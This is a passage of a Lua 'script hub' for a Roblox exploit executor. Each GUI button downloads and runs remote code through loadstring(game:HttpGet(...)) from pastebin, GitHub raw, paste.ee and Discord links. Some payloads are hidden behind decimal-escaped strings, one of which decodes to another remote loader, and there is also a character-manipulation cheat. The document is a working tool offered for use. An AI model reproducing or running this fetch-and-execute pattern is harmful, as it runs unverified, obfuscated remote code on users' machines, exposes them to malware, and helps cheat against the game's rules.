    loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\40\39\104\116\116\112\115\58\47\47\103\105\115\116\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\109\101\111\122\111\110\101\89\84\47\98\102\48\51\55\100\102\102\57\102\48\97\55\48\48\49\55\51\48\52\100\100\100\54\55\102\100\99\100\51\55\48\47\114\97\119\47\101\49\52\101\55\52\102\52\50\53\98\48\54\48\100\102\53\50\51\51\52\51\99\102\51\48\98\55\56\55\48\55\52\101\98\51\99\53\100\50\47\97\114\99\101\117\115\37\50\53\50\48\120\37\50\53\50\48\102\108\121\37\50\53\50\48\50\37\50\53\50\48\111\98\102\108\117\99\97\116\111\114\39\41\44\116\114\117\101\41\41\40\41\10\10")()
end)
Piano1Section:NewButton("Piano Auto play v3 Fe", "Credits Bacon", function()
    loadstring(game:HttpGet("https://cdn.discordapp.com/attachments/988547966354735134/989051317580349450/out.lua",true))()
end)
Section:NewButton("Become ball Fe", "r15 or r6", function()
    local UserInputService = game:GetService("UserInputService")
local RunService = game:GetService("RunService")
local Camera = workspace.CurrentCamera

local SPEED_MULTIPLIER = 30
local JUMP_POWER = 60
local JUMP_GAP = 0.3

local character = game.Players.LocalPlayer.Character

for i,v in ipairs(character:GetDescendants()) do
   if v:IsA("BasePart") then
       v.CanCollide = false
   end
end

local ball = character.HumanoidRootPart
ball.Shape = Enum.PartType.Ball
ball.Size = Vector3.new(5,5,5)
local humanoid = character:WaitForChild("Humanoid")
local params = RaycastParams.new()
params.FilterType = Enum.RaycastFilterType.Blacklist
params.FilterDescendantsInstances = {character}

local tc = RunService.RenderStepped:Connect(function(delta)
   ball.CanCollide = true
   humanoid.PlatformStand = true
if UserInputService:GetFocusedTextBox() then return end
if UserInputService:IsKeyDown("W") then
ball.RotVelocity = Camera.CFrame.RightVector * delta * SPEED_MULTIPLIER
end
if UserInputService:IsKeyDown("A") then
ball.RotVelocity = Camera.CFrame.LookVector * delta * SPEED_MULTIPLIER
end
if UserInputService:IsKeyDown("S") then
ball.RotVelocity = Camera.CFrame.RightVector * delta * SPEED_MULTIPLIER
end
if UserInputService:IsKeyDown("D") then
ball.RotVelocity = Camera.CFrame.LookVector * delta * SPEED_MULTIPLIER
end
--ball.RotVelocity = ball.RotVelocity - Vector3.new(0,ball.RotVelocity.Y/50,0)
end)

UserInputService.JumpRequest:Connect(function()
local result = workspace:Raycast(
ball.Position,
Vector3.new(
0,
-((ball.Size.Y/2)+JUMP_GAP),
0
),
params
)
if result then
ball.Velocity = ball.Velocity + Vector3.new(0,JUMP_POWER,0)
end
end)

Camera.CameraSubject = ball
humanoid.Died:Connect(function() tc:Disconnect() end)

end)

Section:NewButton("ParaDox gui", "Idk", function()
    loadstring(game:HttpGet(('https://pastebin.com/raw/JLPe0B3H'),true))();
end)
End1Section:NewButton("DarkXHub", "animations gui hats ", function()
    -- Gui to Lua
-- Version: 3.2

-- Instances:

local ScreenGui = Instance.new("ScreenGui")
local Main = Instance.new("Frame")
local UICorner = Instance.new("UICorner")
local OutLine = Instance.new("Frame")
local TextLabel = Instance.new("TextLabel")
local UICorner_2 = Instance.new("UICorner")
local Scripts = Instance.new("TextButton")
local UICorner_3 = Instance.new("UICorner")
local UICorner_4 = Instance.new("UICorner")
local Hubs = Instance.new("TextButton")
local UICorner_5 = Instance.new("UICorner")
local Admin = Instance.new("TextButton")
local UICorner_6 = Instance.new("UICorner")
local Credits = Instance.new("TextButton")
local UICorner_7 = Instance.new("UICorner")
local Home = Instance.new("TextButton")
local UICorner_8 = Instance.new("UICorner")
local HubsTab = Instance.new("Frame")
local TextLabel_2 = Instance.new("TextLabel")
local UICorner_9 = Instance.new("UICorner")
local VHUB = Instance.new("TextButton")
local UICorner_10 = Instance.new("UICorner")
local UICorner_11 = Instance.new("UICorner")
local LXHUB = Instance.new("TextButton")
local UICorner_12 = Instance.new("UICorner")
local PROHUB = Instance.new("TextButton")
local UICorner_13 = Instance.new("UICorner")
local FIREXHUB = Instance.new("TextButton")
local UICorner_14 = Instance.new("UICorner")
local SUSHIHUB = Instance.new("TextButton")
local UICorner_15 = Instance.new("UICorner")
local MOONUIHUB = Instance.new("TextButton")
local UICorner_16 = Instance.new("UICorner")
local DOMAINXHUB = Instance.new("TextButton")
local UICorner_17 = Instance.new("UICorner")
local GHOSTHUB = Instance.new("TextButton")
local UICorner_18 = Instance.new("UICorner")
local ICEHUBFORBH = Instance.new("TextButton")
local UICorner_19 = Instance.new("UICorner")
local ScriptsTab = Instance.new("Frame")
local TextLabel_3 = Instance.new("TextLabel")
local UICorner_20 = Instance.new("UICorner")
local FeAmongUs = Instance.new("TextButton")
local UICorner_21 = Instance.new("UICorner")
local UICorner_22 = Instance.new("UICorner")
local FEWingedMaster = Instance.new("TextButton")
local UICorner_23 = Instance.new("UICorner")
local FEHatsPet = Instance.new("TextButton")
local UICorner_24 = Instance.new("UICorner")
local FEHumanCar = Instance.new("TextButton")
local UICorner_25 = Instance.new("UICorner")
local FESnake = Instance.new("TextButton")
local UICorner_26 = Instance.new("UICorner")
local FEFly = Instance.new("TextButton")
local UICorner_27 = Instance.new("UICorner")
local FEHoldAcc = Instance.new("TextButton")
local UICorner_28 = Instance.new("UICorner")
local HatsV2 = Instance.new("TextButton")
local UICorner_29 = Instance.new("UICorner")
local Keyboard = Instance.new("TextButton")
local UICorner_30 = Instance.new("UICorner")
local AdminTab = Instance.new("Frame")
local TextLabel_4 = Instance.new("TextLabel")
local UICorner_31 = Instance.new("UICorner")
local FatesAdmin = Instance.new("TextButton")
local UICorner_32 = Instance.new("UICorner")
local UICorner_33 = Instance.new("UICorner")
local RevisAdmin = Instance.new("TextButton")
local UICorner_34 = Instance.new("UICorner")
local InfiniteYield = Instance.new("TextButton")
local UICorner_35 = Instance.new("UICorner")
local CreditsTab = Instance.new("Frame")
local Credits_2 = Instance.new("TextLabel")
local UICorner_36 = Instance.new("UICorner")
local UICorner_37 = Instance.new("UICorner")
local TextLabel_5 = Instance.new("TextLabel")
local UICorner_38 = Instance.new("UICorner")
local TextLabel_6 = Instance.new("TextLabel")
local UICorner_39 = Instance.new("UICorner")
local TextLabel_7 = Instance.new("TextLabel")
local UICorner_40 = Instance.new("UICorner")
local HomeTab = Instance.new("Frame")
local TextLabel_8 = Instance.new("TextLabel")
local UICorner_41 = Instance.new("UICorner")
local UICorner_42 = Instance.new("UICorner")
local TextLabel_9 = Instance.new("TextLabel")
local UICorner_43 = Instance.new("UICorner")
local TextLabel_10 = Instance.new("TextLabel")
local UICorner_44 = Instance.new("UICorner")
local TextLabel_11 = Instance.new("TextLabel")
local UICorner_45 = Instance.new("UICorner")
local Close = Instance.new("TextButton")
local Open = Instance.new("TextButton")

--Properties:

ScreenGui.Parent = game.CoreGui
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

Main.Name = "Main"
Main.Parent = ScreenGui
Main.BackgroundColor3 = Color3.fromRGB(38, 38, 38)
Main.Position = UDim2.new(0.181409299, 0, 0.146666661, 0)
Main.Size = UDim2.new(0, 424, 0, 264)
Main.Active = true
Main.Draggable = true

UICorner.Parent = Main

OutLine.Name = "OutLine"
OutLine.Parent = Main
OutLine.BackgroundColor3 = Color3.fromRGB(75, 75, 75)
OutLine.Position = UDim2.new(0.0353773609, 0, 0.0454545468, 0)
OutLine.Size = UDim2.new(0, 393, 0, 238)

TextLabel.Parent = OutLine
TextLabel.BackgroundColor3 = Color3.fromRGB(38, 38, 38)
TextLabel.BorderColor3 = Color3.fromRGB(27, 42, 53)
TextLabel.Position = UDim2.new(0, 0, -0.0504201688, 0)
TextLabel.Size = UDim2.new(0, 96, 0, 256)
TextLabel.Font = Enum.Font.SourceSans
TextLabel.Text = " "
TextLabel.TextColor3 = Color3.fromRGB(0, 0, 0)
TextLabel.TextSize = 14.000

UICorner_2.Parent = TextLabel

Scripts.Name = "Scripts"
Scripts.Parent = OutLine
Scripts.BackgroundColor3 = Color3.fromRGB(75, 75, 75)
Scripts.Position = UDim2.new(0, 0, 0.0504201725, 0)
Scripts.Size = UDim2.new(0, 83, 0, 24)
Scripts.Font = Enum.Font.SourceSans
Scripts.Text = "Scripts"
Scripts.TextColor3 = Color3.fromRGB(0, 0, 0)
Scripts.TextSize = 14.000
Scripts.MouseButton1Down:Connect(function()
	ScriptsTab.Visible = true
	HomeTab.Visible = false
	CreditsTab.Visible = false
	AdminTab.Visible = false
	HubsTab.Visible = false
end)

UICorner_3.Parent = Scripts

UICorner_4.Parent = OutLine

Hubs.Name = "Hubs"
Hubs.Parent = OutLine
Hubs.BackgroundColor3 = Color3.fromRGB(75, 75, 75)
Hubs.Position = UDim2.new(0, 0, 0.189075649, 0)
Hubs.Size = UDim2.new(0, 83, 0, 24)
Hubs.Font = Enum.Font.SourceSans
Hubs.Text = "Hubs"
Hubs.TextColor3 = Color3.fromRGB(0, 0, 0)
Hubs.TextSize = 14.000
Hubs.MouseButton1Down:Connect(function()
	HubsTab.Visible = true
	ScriptsTab.Visible = false
	CreditsTab.Visible = false
	AdminTab.Visible = false
	HomeTab.Visible = false
end)

UICorner_5.Parent = Hubs

Admin.Name = "Admin"
Admin.Parent = OutLine
Admin.BackgroundColor3 = Color3.fromRGB(75, 75, 75)
Admin.Position = UDim2.new(0, 0, 0.327731133, 0)
Admin.Size = UDim2.new(0, 83, 0, 24)
Admin.Font = Enum.Font.SourceSans
Admin.Text = "Admin"
Admin.TextColor3 = Color3.fromRGB(0, 0, 0)
Admin.TextSize = 14.000
Admin.MouseButton1Down:Connect(function()
	ScriptsTab.Visible = false
	HomeTab.Visible = false
	CreditsTab.Visible = false
	AdminTab.Visible = true
	HubsTab.Visible = false
end)

UICorner_6.Parent = Admin

Credits.Name = "Credits"
Credits.Parent = OutLine
Credits.BackgroundColor3 = Color3.fromRGB(75, 75, 75)
Credits.Position = UDim2.new(0, 0, 0.899159729, 0)
Credits.Size = UDim2.new(0, 83, 0, 24)
Credits.Font = Enum.Font.SourceSans
Credits.Text = "Credits"
Credits.TextColor3 = Color3.fromRGB(0, 0, 0)
Credits.TextSize = 14.000
Credits.MouseButton1Down:Connect(function()
	ScriptsTab.Visible = false
	HomeTab.Visible = false
	CreditsTab.Visible = true
	AdminTab.Visible = false
	HubsTab.Visible = false
end)

UICorner_7.Parent = Credits

Home.Name = "Home"
Home.Parent = OutLine
Home.BackgroundColor3 = Color3.fromRGB(75, 75, 75)
Home.Position = UDim2.new(0, 0, 0.768907607, 0)
Home.Size = UDim2.new(0, 83, 0, 24)
Home.Font = Enum.Font.SourceSans
Home.Text = "Home"
Home.TextColor3 = Color3.fromRGB(0, 0, 0)
Home.TextSize = 14.000
Home.MouseButton1Down:Connect(function()
	ScriptsTab.Visible = false
	HomeTab.Visible = true
	CreditsTab.Visible = false
	AdminTab.Visible = false
	HubsTab.Visible = false
end)
UICorner_8.Parent = Home

HubsTab.Name = "HubsTab"
HubsTab.Parent = OutLine
HubsTab.BackgroundColor3 = Color3.fromRGB(75, 75, 75)
HubsTab.Position = UDim2.new(0.24427481, 0, 0.00420168089, 0)
HubsTab.Size = UDim2.new(0, 297, 0, 237)
HubsTab.Visible = false

TextLabel_2.Parent = HubsTab
TextLabel_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_2.BackgroundTransparency = 1.000
TextLabel_2.Size = UDim2.new(0, 297, 0, 35)
TextLabel_2.Font = Enum.Font.SourceSans
TextLabel_2.Text = "Hubs"
TextLabel_2.TextColor3 = Color3.fromRGB(0, 0, 0)
TextLabel_2.TextSize = 25.000

UICorner_9.Parent = TextLabel_2

VHUB.Name = "VHUB"
VHUB.Parent = HubsTab
VHUB.BackgroundColor3 = Color3.fromRGB(38, 38, 38)
VHUB.Position = UDim2.new(0.0303030312, 0, 0.185654014, 0)
VHUB.Size = UDim2.new(0, 106, 0, 24)
VHUB.Font = Enum.Font.SourceSans
VHUB.Text = "VHUB"
VHUB.TextColor3 = Color3.fromRGB(0, 0, 0)
VHUB.TextSize = 14.000
VHUB.MouseButton1Down:Connect(function()
	loadstring(game:HttpGet(('https://raw.githubusercontent.com/itsyaboivincentt5315/script/main/VHub.txt'),true))()
end)

UICorner_10.Parent = VHUB

UICorner_11.Parent = HubsTab

LXHUB.Name = "LX HUB"
LXHUB.Parent = HubsTab
LXHUB.BackgroundColor3 = Color3.fromRGB(38, 38, 38)
LXHUB.Position = UDim2.new(0.585858583, 0, 0.185654014, 0)
LXHUB.Size = UDim2.new(0, 106, 0, 24)
LXHUB.Font = Enum.Font.SourceSans
LXHUB.Text = "LX HUB"
LXHUB.TextColor3 = Color3.fromRGB(0, 0, 0)
LXHUB.TextSize = 14.000
LXHUB.MouseButton1Down:Connect(function()
	loadstring(game:HttpGet(('https://raw.githubusercontent.com/Gogogamer61/LXHub-Main/main/LXHub%20Main%20Script'),true))()
end)

UICorner_12.Parent = LXHUB

PROHUB.Name = "PRO HUB"
PROHUB.Parent = HubsTab
PROHUB.BackgroundColor3 = Color3.fromRGB(38, 38, 38)
PROHUB.Position = UDim2.new(0.0303030312, 0, 0.350210965, 0)
PROHUB.Size = UDim2.new(0, 106, 0, 24)
PROHUB.Font = Enum.Font.SourceSans
PROHUB.Text = "PRO HUB"
PROHUB.TextColor3 = Color3.fromRGB(0, 0, 0)
PROHUB.TextSize = 14.000
PROHUB.MouseButton1Down:Connect(function()
	loadstring(game:HttpGet(("https://raw.githubusercontent.com/Kindasua/v.1-beta/main/Fixed%20bugs%20v.1%20beta"), true))()
end)

UICorner_13.Parent = PROHUB

FIREXHUB.Name = "FIRE X HUB"
FIREXHUB.Parent = HubsTab
FIREXHUB.BackgroundColor3 = Color3.fromRGB(38, 38, 38)
FIREXHUB.Position = UDim2.new(0.585858583, 0, 0.350210965, 0)
FIREXHUB.Size = UDim2.new(0, 106, 0, 24)
FIREXHUB.Font = Enum.Font.SourceSans
FIREXHUB.Text = "FIRE X HUB"
FIREXHUB.TextColor3 = Color3.fromRGB(0, 0, 0)
FIREXHUB.TextSize = 14.000
FIREXHUB.MouseButton1Down:Connect(function()
	loadstring(game:HttpGet('https://raw.githubusercontent.com/tyreltrijo/firex/main/firex'))()
end)

UICorner_14.Parent = FIREXHUB

SUSHIHUB.Name = "SUSHI HUB"
SUSHIHUB.Parent = HubsTab
SUSHIHUB.BackgroundColor3 = Color3.fromRGB(38, 38, 38)
SUSHIHUB.Position = UDim2.new(0.585858583, 0, 0.514767945, 0)
SUSHIHUB.Size = UDim2.new(0, 106, 0, 24)
SUSHIHUB.Font = Enum.Font.SourceSans
SUSHIHUB.Text = "SUSHI HUB"
SUSHIHUB.TextColor3 = Color3.fromRGB(0, 0, 0)
SUSHIHUB.TextSize = 14.000
SUSHIHUB.MouseButton1Down:Connect(function()
	loadstring(game:HttpGet("https://paste.ee/r/bf5oO", true))()
end)

UICorner_15.Parent = SUSHIHUB

MOONUIHUB.Name = "MOONUI HUB"
MOONUIHUB.Parent = HubsTab
MOONUIHUB.BackgroundColor3 = Color3.fromRGB(38, 38, 38)
MOONUIHUB.Position = UDim2.new(0.0303030014, 0, 0.514767945, 0)
MOONUIHUB.Size = UDim2.new(0, 106, 0, 24)
MOONUIHUB.Font = Enum.Font.SourceSans
MOONUIHUB.Text = "MOONUI HUB"
MOONUIHUB.TextColor3 = Color3.fromRGB(0, 0, 0)
MOONUIHUB.TextSize = 14.000
MOONUIHUB.MouseButton1Down:Connect(function()
	loadstring(game:HttpGet('https://raw.githubusercontent.com/IlikeyocutgHAH12/MoonUI-v10-/main/MoonUI%20v10'))()
end)

UICorner_16.Parent = MOONUIHUB

DOMAINXHUB.Name = "DOMAINX HUB"
DOMAINXHUB.Parent = HubsTab
DOMAINXHUB.BackgroundColor3 = Color3.fromRGB(38, 38, 38)
DOMAINXHUB.Position = UDim2.new(0.0303030014, 0, 0.666666687, 0)
DOMAINXHUB.Size = UDim2.new(0, 106, 0, 24)
DOMAINXHUB.Font = Enum.Font.SourceSans
DOMAINXHUB.Text = "DOMAINX HUB"
DOMAINXHUB.TextColor3 = Color3.fromRGB(0, 0, 0)
DOMAINXHUB.TextSize = 14.000
DOMAINXHUB.MouseButton1Down:Connect(function()
	loadstring(game:HttpGet('https://raw.githubusercontent.com/shlexware/DomainX/main/source',true))()
end)

UICorner_17.Parent = DOMAINXHUB

GHOSTHUB.Name = "GHOST HUB"
GHOSTHUB.Parent = HubsTab
GHOSTHUB.BackgroundColor3 = Color3.fromRGB(38, 38, 38)
GHOSTHUB.Position = UDim2.new(0.585858583, 0, 0.666666687, 0)
GHOSTHUB.Size = UDim2.new(0, 106, 0, 24)
GHOSTHUB.Font = Enum.Font.SourceSans
GHOSTHUB.Text = "GHOST HUB"
GHOSTHUB.TextColor3 = Color3.fromRGB(0, 0, 0)
GHOSTHUB.TextSize = 14.000
GHOSTHUB.MouseButton1Down:Connect(function()
	loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\39\104\116\116\112\115\58\47\47\112\97\115\116\101\98\105\110\46\99\111\109\47\114\97\119\47\80\117\118\112\49\100\119\78\39\41\41\40\41\10")()
end)

UICorner_18.Parent = GHOSTHUB

ICEHUBFORBH.Name = "ICE HUB FOR BH"
ICEHUBFORBH.Parent = HubsTab
ICEHUBFORBH.BackgroundColor3 = Color3.fromRGB(38, 38, 38)
ICEHUBFORBH.Position = UDim2.new(0.0303030312, 0, 0.822784841, 0)
ICEHUBFORBH.Size = UDim2.new(0, 271, 0, 24)
ICEHUBFORBH.Font = Enum.Font.SourceSans
ICEHUBFORBH.Text = "ICE HUB FOR BH"
ICEHUBFORBH.TextColor3 = Color3.fromRGB(0, 0, 0)
ICEHUBFORBH.TextSize = 14.000
ICEHUBFORBH.MouseButton1Down:Connect(function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/IceMael7/NewIceHub/main/Brookhaven"))()
end)

UICorner_19.Parent = ICEHUBFORBH

ScriptsTab.Name = "ScriptsTab"
ScriptsTab.Parent = OutLine
ScriptsTab.BackgroundColor3 = Color3.fromRGB(75, 75, 75)
ScriptsTab.Position = UDim2.new(0.24427481, 0, 0.00420168089, 0)
ScriptsTab.Size = UDim2.new(0, 297, 0, 237)
ScriptsTab.Visible = false

TextLabel_3.Parent = ScriptsTab
TextLabel_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_3.BackgroundTransparency = 1.000
TextLabel_3.Size = UDim2.new(0, 297, 0, 35)
TextLabel_3.Font = Enum.Font.SourceSans
TextLabel_3.Text = "Scripts"
TextLabel_3.TextColor3 = Color3.fromRGB(0, 0, 0)
TextLabel_3.TextSize = 25.000

UICorner_20.Parent = TextLabel_3

FeAmongUs.Name = "Fe Among Us"
FeAmongUs.Parent = ScriptsTab
FeAmongUs.BackgroundColor3 = Color3.fromRGB(38, 38, 38)
FeAmongUs.Position = UDim2.new(0.0303030312, 0, 0.185654014, 0)
FeAmongUs.Size = UDim2.new(0, 106, 0, 24)
FeAmongUs.Font = Enum.Font.SourceSans
FeAmongUs.Text = "Fe Among Us"
FeAmongUs.TextColor3 = Color3.fromRGB(0, 0, 0)
FeAmongUs.TextSize = 14.000
FeAmongUs.MouseButton1Down:Connect(function()
	loadstring(game:HttpGet("https://pastebin.com/raw/13Lsv9PQ"))()
end)

UICorner_21.Parent = FeAmongUs

UICorner_22.Parent = ScriptsTab

FEWingedMaster.Name = "FE Winged Master"
FEWingedMaster.Parent = ScriptsTab
FEWingedMaster.BackgroundColor3 = Color3.fromRGB(38, 38, 38)
FEWingedMaster.Position = UDim2.new(0.585858583, 0, 0.185654014, 0)
FEWingedMaster.Size = UDim2.new(0, 106, 0, 24)
FEWingedMaster.Font = Enum.Font.SourceSans
FEWingedMaster.Text = "FE Winged Master"
FEWingedMaster.TextColor3 = Color3.fromRGB(0, 0, 0)
FEWingedMaster.TextSize = 14.000
FEWingedMaster.MouseButton1Down:Connect(function()
	loadstring(game:HttpGet("https://pastebin.com/raw/8bBBHR7D"))()
end)

UICorner_23.Parent = FEWingedMaster

FEHatsPet.Name = "FE Hats Pet"
FEHatsPet.Parent = ScriptsTab
FEHatsPet.BackgroundColor3 = Color3.fromRGB(38, 38, 38)
FEHatsPet.Position = UDim2.new(0.0303030312, 0, 0.350210965, 0)
FEHatsPet.Size = UDim2.new(0, 106, 0, 24)
FEHatsPet.Font = Enum.Font.SourceSans
FEHatsPet.Text = "FE Hats Pet"
FEHatsPet.TextColor3 = Color3.fromRGB(0, 0, 0)
FEHatsPet.TextSize = 14.000
FEHatsPet.MouseButton1Down:Connect(function()
	loadstring("\10\45\45\45\32\121\111\117\32\115\116\117\112\105\100\10\10\103\97\109\101\58\71\101\116\83\101\114\118\105\99\101\40\34\83\116\97\114\116\101\114\71\117\105\34\41\58\83\101\116\67\111\114\101\40\34\83\101\110\100\78\111\116\105\102\105\99\97\116\105\111\110\34\44\123\10\32\32\32\32\84\105\116\108\101\32\61\32\34\73\109\32\80\97\116\114\105\99\107\34\59\10\32\32\32\32\84\101\120\116\32\61\32\34\78\101\116\108\101\115\115\32\108\111\97\100\101\100\34\59\10\32\32\32\32\68\117\114\97\116\105\111\110\32\61\32\49\48\59\10\125\41\10\10\102\111\114\32\105\44\118\32\105\110\32\110\101\120\116\44\32\103\97\109\101\58\71\101\116\83\101\114\118\105\99\101\40\34\80\108\97\121\101\114\115\34\41\46\76\111\99\97\108\80\108\97\121\101\114\46\67\104\97\114\97\99\116\101\114\58\71\101\116\68\101\115\99\101\110\100\97\110\116\115\40\41\32\100\111\10\32\32\32\32\105\102\32\118\58\73\115\65\40\34\66\97\115\101\80\97\114\116\34\41\32\97\110\100\32\118\46\78\97\109\101\32\126\61\34\72\117\109\97\110\111\105\100\82\111\111\116\80\97\114\116\34\32\116\104\101\110\32\10\32\32\32\32\103\97\109\101\58\71\101\116\83\101\114\118\105\99\101\40\34\82\117\110\83\101\114\118\105\99\101\34\41\46\72\101\97\114\116\98\101\97\116\58\99\111\110\110\101\99\116\40\102\117\110\99\116\105\111\110\40\41\10\32\32\32\32\118\46\86\101\108\111\99\105\116\121\32\61\32\86\101\99\116\111\114\51\46\110\101\119\40\45\51\48\44\48\44\48\41\10\32\32\32\32\101\110\100\41\10\32\32\32\32\101\110\100\10\32\32\32\32\101\110\100\10\10\32\32\32\32\108\111\99\97\108\32\112\108\114\32\61\32\103\97\109\101\58\71\101\116\83\101\114\118\105\99\101\40\34\80\108\97\121\101\114\115\34\41\46\76\111\99\97\108\80\108\97\121\101\114\10\32\32\32\32\108\111\99\97\108\32\99\104\97\114\32\61\32\112\108\114\46\67\104\97\114\97\99\116\101\114\10\10\108\111\99\97\108\32\108\112\32\61\32\103\97\109\101\46\80\108\97\121\101\114\115\46\76\111\99\97\108\80\108\97\121\101\114\10\10\10\102\111\114\32\105\44\32\118\32\105\110\32\112\97\105\114\115\40\99\104\97\114\58\71\101\116\67\104\105\108\100\114\101\110\40\41\41\32\100\111\10\32\32\32\32\105\102\32\118\58\73\115\65\40\34\66\97\108\108\83\111\99\107\101\116\67\111\110\115\116\114\97\105\110\116\34\41\32\116\104\101\110\10\32\32\32\32\32\32\32\32\118\58\68\101\115\116\114\111\121\40\41\10\32\32\32\32\101\110\100\10\101\110\100\10\10\102\111\114\32\105\44\32\118\32\105\110\32\112\97\105\114\115\40\99\104\97\114\58\71\101\116\67\104\105\108\100\114\101\110\40\41\41\32\100\111\10\32\32\32\32\105\102\32\118\58\73\115\65\40\34\72\105\110\103\101\67\111\110\115\116\114\97\105\110\116\34\41\32\116\104\101\110\10\32\32\32\32\32\32\32\32\118\58\68\101\115\116\114\111\121\40\41\10\32\32\32\32\101\110\100\10\101\110\100\10\10\102\111\114\32\105\44\32\118\32\105\110\32\112\97\105\114\115\40\99\104\97\114\46\72\117\109\97\110\111\105\100\58\71\101\116\65\99\99\101\115\115\111\114\105\101\115\40\41\41\32\100\111\10\108\111\99\97\108\32\104\97\116\32\61\32\118\46\78\97\109\101\10\10\99\104\97\114\91\104\97\116\93\46\65\114\99\104\105\118\97\98\108\101\32\61\32\116\114\117\101\10\108\111\99\97\108\32\102\97\107\101\32\61\32\99\104\97\114\91\104\97\116\93\58\67\108\111\110\101\40\41\10\102\97\107\101\46\80\97\114\101\110\116\32\61\32\99\104\97\114\10\102\97\107\101\46\72\97\110\100\108\101\46\84\114\97\110\115\112\97\114\101\110\99\121\32\61\32\49\10\10\10\10\10\32\32\32\32\108\111\99\97\108\32\99\97\114\32\61\32\99\104\97\114\91\104\97\116\93\10\10\10\10\32\32\32\32\108\111\99\97\108\32\97\116\116\49\32\61\32\73\110\115\116\97\110\99\101\46\110\101\119\40\34\65\116\116\97\99\104\109\101\110\116\34\44\99\97\114\46\72\97\110\100\108\101\41\10\10\32\32\32\32\108\111\99\97\108\32\97\112\32\61\32\73\110\115\116\97\110\99\101\46\110\101\119\40\34\65\108\105\103\110\80\111\115\105\116\105\111\110\34\44\99\97\114\46\72\97\110\100\108\101\41\10\32\32\32\32\97\112\46\65\116\116\97\99\104\109\101\110\116\48\32\61\32\97\116\116\49\10\32\32\32\32\97\112\46\65\116\116\97\99\104\109\101\110\116\49\32\61\32\97\116\116\49\10\32\32\32\32\97\112\46\82\105\103\105\100\105\116\121\69\110\97\98\108\101\100\32\61\32\116\114\117\101\32\10\10\10\32\32\32\32\108\111\99\97\108\32\97\111\32\61\32\73\110\115\116\97\110\99\101\46\110\101\119\40\34\65\108\105\103\110\79\114\105\101\110\116\97\116\105\111\110\34\44\99\97\114\46\72\97\110\100\108\101\41\32\10\32\32\32\32\97\111\46\65\116\116\97\99\104\109\101\110\116\48\32\61\32\97\116\116\49\10\32\32\32\32\97\111\46\65\116\116\97\99\104\109\101\110\116\49\32\61\32\97\116\116\49\10\32\32\32\32\97\111\46\82\105\103\105\100\105\116\121\69\110\97\98\108\101\100\32\61\32\116\114\117\101\10\32\32\32\32\10\32\32\32\32\99\97\114\46\72\97\110\100\108\101\46\65\99\99\101\115\115\111\114\121\87\101\108\100\58\68\101\115\116\114\111\121\40\41\10\10\32\32\32\32\32\32\32\32\108\111\99\97\108\32\66\80\32\61\32\73\110\115\116\97\110\99\101\46\110\101\119\40\34\66\111\100\121\80\111\115\105\116\105\111\110\34\44\32\99\97\114\46\72\97\110\100\108\101\41\10\32\32\32\32\32\32\32\32\108\111\99\97\108\32\66\71\32\61\32\73\110\115\116\97\110\99\101\46\110\101\119\40\34\66\111\100\121\71\121\114\111\34\44\32\99\97\114\46\72\97\110\100\108\101\41\10\32\32\32\32\32\32\32\32\103\97\109\101\58\71\101\116\83\101\114\118\105\99\101\40\34\82\117\110\83\101\114\118\105\99\101\34\41\46\83\116\101\112\112\101\100\58\67\111\110\110\101\99\116\40\102\117\110\99\116\105\111\110\40\41\10\32\32\32\32\32\32\32\32\32\32\66\80\46\77\97\120\70\111\114\99\101\32\61\32\86\101\99\116\111\114\51\46\110\101\119\40\109\97\116\104\46\104\117\103\101\44\32\109\97\116\104\46\104\117\103\101\44\32\109\97\116\104\46\104\117\103\101\41\10\32\32\32\32\32\32\32\32\32\32\66\80\46\80\111\115\105\116\105\111\110\32\61\32\99\104\97\114\91\34\72\117\109\97\110\111\105\100\82\111\111\116\80\97\114\116\34\93\46\80\111\115\105\116\105\111\110\32\43\32\86\101\99\116\111\114\51\46\110\101\119\40\53\44\32\49\46\56\44\32\51\41\10\32\32\32\32\32\32\32\32\32\32\66\71\46\77\97\120\84\111\114\113\117\101\32\61\32\86\101\99\116\111\114\51\46\110\101\119\40\109\97\116\104\46\104\117\103\101\44\32\109\97\116\104\46\104\117\103\101\44\32\109\97\116\104\46\104\117\103\101\41\10\32\32\32\32\32\32\32\32\32\32\66\71\46\67\70\114\97\109\101\32\61\32\99\104\97\114\91\34\72\117\109\97\110\111\105\100\82\111\111\116\80\97\114\116\34\93\46\67\70\114\97\109\101\10\32\32\32\32\32\32\32\32\101\110\100\41\10\101\110\100\10")()
end)

UICorner_24.Parent = FEHatsPet

FEHumanCar.Name = "FE Human Car"
FEHumanCar.Parent = ScriptsTab
FEHumanCar.BackgroundColor3 = Color3.fromRGB(38, 38, 38)
FEHumanCar.Position = UDim2.new(0.585858583, 0, 0.350210965, 0)
FEHumanCar.Size = UDim2.new(0, 106, 0, 24)
FEHumanCar.Font = Enum.Font.SourceSans
FEHumanCar.Text = "FE Human Car"
FEHumanCar.TextColor3 = Color3.fromRGB(0, 0, 0)
FEHumanCar.TextSize = 14.000
FEHumanCar.MouseButton1Down:Connect(function()
	loadstring(game:HttpGet("https://pastebin.com/raw/9D3ks2J8"))()
end)

UICorner_25.Parent = FEHumanCar

FESnake.Name = "FE Snake"
FESnake.Parent = ScriptsTab
FESnake.BackgroundColor3 = Color3.fromRGB(38, 38, 38)
FESnake.Position = UDim2.new(0.585858583, 0, 0.514767945, 0)
FESnake.Size = UDim2.new(0, 106, 0, 24)
FESnake.Font = Enum.Font.SourceSans
FESnake.Text = "FE Snake"
FESnake.TextColor3 = Color3.fromRGB(0, 0, 0)
FESnake.TextSize = 14.000
FESnake.MouseButton1Down:Connect(function()
	loadstring(game:HttpGet("https://pastebin.com/raw/NcBzpPwm"))()
end)

UICorner_26.Parent = FESnake

FEFly.Name = "FE Fly"
FEFly.Parent = ScriptsTab
FEFly.BackgroundColor3 = Color3.fromRGB(38, 38, 38)
FEFly.Position = UDim2.new(0.0303030014, 0, 0.514767945, 0)
FEFly.Size = UDim2.new(0, 106, 0, 24)
FEFly.Font = Enum.Font.SourceSans
FEFly.Text = "FE Fly"
FEFly.TextColor3 = Color3.fromRGB(0, 0, 0)
FEFly.TextSize = 14.000
